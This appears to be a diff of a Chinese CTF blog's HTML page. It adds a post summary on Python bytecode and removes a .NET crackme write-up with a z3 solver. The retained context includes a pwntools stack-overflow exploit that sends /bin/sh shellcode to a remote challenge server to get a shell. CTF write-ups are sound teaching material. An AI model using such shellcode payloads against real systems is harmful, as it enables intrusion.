@@ -199,6 +199,66 @@
 </nav>
       <div class="body-wrap">
   
+    <article id="post-HGAME2019-python-bytecode" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2019/02/06/HGAME2019-python-bytecode/" class="article-date">
+      <time datetime="2019-02-06T09:32:22.000Z" itemprop="datePublished">2019-02-06</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/02/06/HGAME2019-python-bytecode/">HGAME2019-python-bytecode</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+              <p>题目给了一个pyc文件，但是不能用uncompyle2反编译成py文件。很难受，给了hint：bytecode。网上🏄发现了python自带的dis模块，可以解析一下pyc文件。</p>
+          
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+      
+        <p class="article-more-link">
+          <a href="/2019/02/06/HGAME2019-python-bytecode/#more">more >></a>
+        </p>
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
     <article id="post-brainfxxker-s-revenge" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -763,64 +823,6 @@
 <h1 id="后门？不存在的"><a href="#后门？不存在的" class="headerlink" title="后门？不存在的"></a>后门？不存在的</h1><p>和上面一题基本差不多，不过没有后门函数了。同样的栈溢出，没开nx保护，同时会打印出存放输入的内存地址，找了个shellcode：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">sh=remote(&quot;123.206.131.120&quot;,10002)</span><br><span class="line">sh.recvuntil(&quot;is&quot;)</span><br><span class="line">sh.recv(3)</span><br><span class="line">add=int(sh.recv(12),16)</span><br><span class="line">shellcode=&quot;\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05&quot;</span><br><span class="line">payload=shellcode+&apos;\x90&apos;*(0x58-len(shellcode))+p64(add)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
 <h1 id="做出了后门也不给你走"><a href="#做出了后门也不给你走" class="headerlink" title="做出了后门也不给你走"></a>做出了后门也不给你走</h1>
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-
-      
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-sus-gccc" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2018/10/25/sus-gccc/" class="article-date">
-      <time datetime="2018-10-25T13:51:39.000Z" itemprop="datePublished">2018-10-25</time>
-</a>
-
-
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/10/25/sus-gccc/">sus-gccc</a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <p>.net程序，dnspy反编译一波：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">// Token: 0x02000002 RID: 2</span><br><span class="line">public class GrayCCC</span><br><span class="line">&#123;</span><br><span class="line">	// Token: 0x06000002 RID: 2 RVA: 0x00002058 File Offset: 0x00000458</span><br><span class="line">	public static void Main()</span><br><span class="line">	&#123;</span><br><span class="line">		Console.Write(&quot;Input the key: &quot;);</span><br><span class="line">		uint num;</span><br><span class="line">		if (!uint.TryParse(Console.ReadLine().Trim(), out num))</span><br><span class="line">		&#123;</span><br><span class="line">			Console.WriteLine(&quot;Invalid key&quot;);</span><br><span class="line">			return;</span><br><span class="line">		&#125;</span><br><span class="line">		string text = &quot;&quot;;</span><br><span class="line">		string text2 = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ&#123;&#125; &quot;;</span><br><span class="line">		int num2 = 0;</span><br><span class="line">		byte[] array = new byte[]</span><br><span class="line">		&#123;</span><br><span class="line">			164,</span><br><span class="line">			25,</span><br><span class="line">			4,</span><br><span class="line">			130,</span><br><span class="line">			126,</span><br><span class="line">			158,</span><br><span class="line">			91,</span><br><span class="line">			199,</span><br><span class="line">			173,</span><br><span class="line">			252,</span><br><span class="line">			239,</span><br><span class="line">			143,</span><br><span class="line">			150,</span><br><span class="line">			251,</span><br><span class="line">			126,</span><br><span class="line">			39,</span><br><span class="line">			104,</span><br><span class="line">			104,</span><br><span class="line">			146,</span><br><span class="line">			208,</span><br><span class="line">			249,</span><br><span class="line">			9,</span><br><span class="line">			219,</span><br><span class="line">			208,</span><br><span class="line">			101,</span><br><span class="line">			182,</span><br><span class="line">			62,</span><br><span class="line">			92,</span><br><span class="line">			6,</span><br><span class="line">			27,</span><br><span class="line">			5,</span><br><span class="line">			46</span><br><span class="line">		&#125;;</span><br><span class="line">		byte b = 0;</span><br><span class="line">		while (num != 0u)</span><br><span class="line">		&#123;</span><br><span class="line">			char c = (char)(array[num2] ^ (byte)num ^ b);</span><br><span class="line">			if (!text2.Contains(new string(c, 1)))</span><br><span class="line">			&#123;</span><br><span class="line">				Console.WriteLine(&quot;Invalid key&quot;);</span><br><span class="line">				return;</span><br><span class="line">			&#125;</span><br><span class="line">			text += c;</span><br><span class="line">			b ^= array[num2++];</span><br><span class="line">			num &gt;&gt;= 1;</span><br><span class="line">		&#125;</span><br><span class="line">		if (text.Substring(0, 5) != &quot;FLAG&#123;&quot; || text.Substring(31, 1) != &quot;&#125;&quot;)</span><br><span class="line">		&#123;</span><br><span class="line">			Console.WriteLine(&quot;Invalid key&quot;);</span><br><span class="line">			return;</span><br><span class="line">		&#125;</span><br><span class="line">		Console.WriteLine(&quot;Your flag is: &quot; + text);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>定义了uint类型变量num，<code>text[i]=array[i]^(num&amp;0xff)^b</code>，<code>b=array[0]^...^array[i]</code>，最后要求text的前五位为FLAG{，最后一位为}，并且每一位都是大写字母，题目推荐使用z3求解。<br>脚本如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">from z3 import *</span><br><span class="line">num=BitVec(&quot;num&quot;,33)</span><br><span class="line">array=[     </span><br><span class="line">            164,</span><br><span class="line">			25,</span><br><span class="line">			4,</span><br><span class="line">			130,</span><br><span class="line">			126,</span><br><span class="line">			158,</span><br><span class="line">			91,</span><br><span class="line">			199,</span><br><span class="line">			173,</span><br><span class="line">			252,</span><br><span class="line">			239,</span><br><span class="line">			143,</span><br><span class="line">			150,</span><br><span class="line">			251,</span><br><span class="line">			126,</span><br><span class="line">			39,</span><br><span class="line">			104,</span><br><span class="line">			104,</span><br><span class="line">			146,</span><br><span class="line">			208,</span><br><span class="line">			249,</span><br><span class="line">			9,</span><br><span class="line">			219,</span><br><span class="line">			208,</span><br><span class="line">			101,</span><br><span class="line">			182,</span><br><span class="line">			62,</span><br><span class="line">			92,</span><br><span class="line">			6,</span><br><span class="line">			27,</span><br><span class="line">			5,</span><br><span class="line">			46]</span><br><span class="line">b=range(32)</span><br><span class="line">for i in range(32):</span><br><span class="line">	temp=0</span><br><span class="line">	for j in range(i):</span><br><span class="line">		temp^=array[j]</span><br><span class="line">	b[i]=temp</span><br><span class="line">solver=Solver()</span><br><span class="line">solver.add(array[0]^(num&amp;0xff)^b[0]==ord(&apos;F&apos;))</span><br><span class="line">solver.add(array[1]^((num&gt;&gt;1)&amp;0xff)^b[1]==ord(&apos;L&apos;))</span><br><span class="line">solver.add(array[2]^((num&gt;&gt;2)&amp;0xff)^b[2]==ord(&apos;A&apos;))</span><br><span class="line">solver.add(array[3]^((num&gt;&gt;3)&amp;0xff)^b[3]==ord(&apos;G&apos;))</span><br><span class="line">solver.add(array[4]^((num&gt;&gt;4)&amp;0xff)^b[4]==ord(&apos;&#123;&apos;))</span><br><span class="line">for i in range(5,31):	</span><br><span class="line">	solver.add(array[i]^((num&gt;&gt;i)&amp;0xff)^b[i]&lt;=126)</span><br><span class="line">	solver.add(array[i]^((num&gt;&gt;i)&amp;0xff)^b[i]&gt;=32)</span><br><span class="line">solver.add(array[31]^((num&gt;&gt;31)&amp;0xff)^b[31]==ord(&apos;&#125;&apos;))</span><br><span class="line">if solver.check()==sat :</span><br><span class="line">	print solver.model()</span><br><span class="line">right_num=3658134498</span><br><span class="line">flag=&quot;&quot;</span><br><span class="line">for i in range(32):</span><br><span class="line">	flag+=chr(array[i]^((right_num&gt;&gt;i)&amp;0xff)^b[i])</span><br><span class="line">print flag</span><br></pre></td></tr></table></figure>
       
     </div>
     
